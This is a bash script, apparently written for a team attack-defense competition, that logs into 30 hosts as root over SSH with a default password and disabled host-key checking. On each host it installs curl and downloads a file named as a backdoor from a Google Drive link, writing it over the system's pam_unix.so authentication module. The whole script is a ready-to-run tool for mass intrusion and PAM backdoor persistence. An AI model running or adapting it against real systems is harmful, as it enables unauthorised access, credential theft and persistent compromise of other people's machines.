#!/bin/bash

IPs=()
username="root"
default_password="Password1!"
timeout_duration=3
path_to_pam="/lib/x86_64-linux-gnu/security"
backdoor_link="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"

install_curl() {
    if command -v curl &>/dev/null; then
        echo "curl is already installed."
        return
    fi

    if [ -f /etc/debian_version ]; then
        sudo apt update && sudo apt install -y curl
    elif [ -f /etc/redhat-release ] || grep -qi "centos\|rhel" /etc/os-release; then
        sudo yum install -y curl
    elif grep -qi "opensuse" /etc/os-release; then
        sudo zypper install -y curl
    elif grep -qi "arch" /etc/os-release; then
        sudo pacman -Syu curl --noconfirm
    else
        echo "Unsupported distribution."
        exit 1
    fi
}

create_IPs() {
    network_id="1.2"
    number_of_teams=10
    host_ids=(1 2 3)
    for ((team=1; team<=number_of_teams; team++)); do
        for host_id in "${host_ids[@]}"; do
            IPs+=("$network_id.$team.$host_id")
        done
    done
}

main() {
    create_IPs
    export default_password timeout_duration username path_to_pam backdoor_link

    printf "%s\n" "${IPs[@]}" | xargs -P 20 -I {} bash -c '
        IP="{}"
        sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$username@$IP" "
            echo \"$default_password\" | sudo -S bash -c \"$(declare -f install_curl); install_curl\";
            echo \"$default_password\" | sudo -S curl -o \"$path_to_pam/pam_unix.so\" \"$backdoor_link\"
        "
    '
}

main
